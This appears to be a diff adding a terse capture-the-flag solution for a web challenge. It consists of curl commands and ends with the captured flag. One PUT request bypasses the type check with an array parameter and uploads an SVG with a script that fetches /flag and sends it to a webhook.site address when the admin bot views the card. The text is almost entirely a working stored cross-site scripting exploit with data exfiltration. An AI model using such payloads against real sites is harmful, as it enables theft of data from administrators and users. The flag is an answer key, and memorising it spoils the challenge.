@@ -1,0 +1,18 @@
+
+curl -X POST https://hallmark.web.actf.co/card -d 'svg=text&content=test'
+
+curl -X PUT  https://hallmark.web.actf.co/card -d 'id=73e20fe6-a6f9-4ce4-a334-95d2221df10d&type[]=image/svg%2Bxml&svg=satoki&content=<?xml version="1.0" encoding="utf-8"?>
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 864 864" style="enable-background:new 0 0 864 864;" xml:space="preserve">
+<script>
+fetch("/flag")
+    .then((response) => response.text())
+    .then((text) => location.href="https://webhook.site/bbf8af87-5501-48ae-8590-73d4204b28ac/?s="%2Btext);
+</script>
+</svg>'
+
+
+put the url: https://hallmark.web.actf.co/card?id=73e20fe6-a6f9-4ce4-a334-95d2221df10d
+int the admin bot
+
+
+actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}
